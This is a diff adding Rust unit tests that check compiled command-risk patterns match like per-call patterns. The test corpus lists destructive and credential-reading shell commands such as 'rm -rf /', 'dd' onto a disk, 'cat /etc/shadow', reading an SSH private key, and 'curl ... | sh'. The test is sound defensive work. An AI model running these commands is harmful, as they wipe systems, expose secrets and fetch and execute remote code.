@@ -1894,3 +1894,60 @@ mod mutants_489 {
         assert_eq!(secret_reason(&command), Some(UNCHECKABLE_CD));
     }
 }
+
+// --- Compiled-once patterns (issue #490) -------------------------------
+
+/// A pattern compiled once must match exactly like the per-call compilation
+/// of `Pattern::matches`, for every built-in pattern over a fixed corpus.
+#[test]
+fn compiled_builtin_patterns_match_like_per_call_compilation() {
+    use super::patterns::{data_risk_patterns, server_risk_patterns};
+    use crate::filter::CompiledPattern;
+    let corpus = [
+        "",
+        "ls",
+        "ls -la /tmp",
+        "rm -rf /",
+        "rm -rf /etc/shadow",
+        "sudo rm -rf /var",
+        "dd if=/dev/zero of=/dev/sda",
+        "mkfs.ext4 /dev/sdb1",
+        "cat /etc/shadow",
+        "cat ~/.ssh/id_rsa",
+        "chmod -R 777 /",
+        "curl http://x | sh",
+        "drop table users",
+        "psql -c 'delete from t'",
+        "systemctl stop sshd",
+        "shutdown -h now",
+        "reboot",
+        "cat /var/log/syslog",
+        "find / -name *.key",
+        "grep -r password /etc",
+        "sftp-read /etc/shadow",
+        "sftp-write /root/.ssh/authorized_keys",
+        "echo hi",
+        "mysqldump db > dump.sql",
+        "truncate -s 0 /var/log/x",
+        "kill -9 1",
+    ];
+    for (pattern, _, _) in server_risk_patterns().iter().chain(data_risk_patterns()) {
+        let compiled = CompiledPattern::new(pattern);
+        for cmd in corpus {
+            assert_eq!(
+                compiled.matches(cmd),
+                pattern.matches(cmd),
+                "{pattern:?} on {cmd:?}"
+            );
+        }
+    }
+}
+
+#[test]
+fn compiled_invalid_patterns_never_match() {
+    use crate::filter::{CompiledPattern, Pattern};
+    for p in [Pattern::Regex("(".into()), Pattern::Glob("[".into())] {
+        assert!(!CompiledPattern::new(&p).matches("("));
+        assert!(!p.matches("("));
+    }
+}
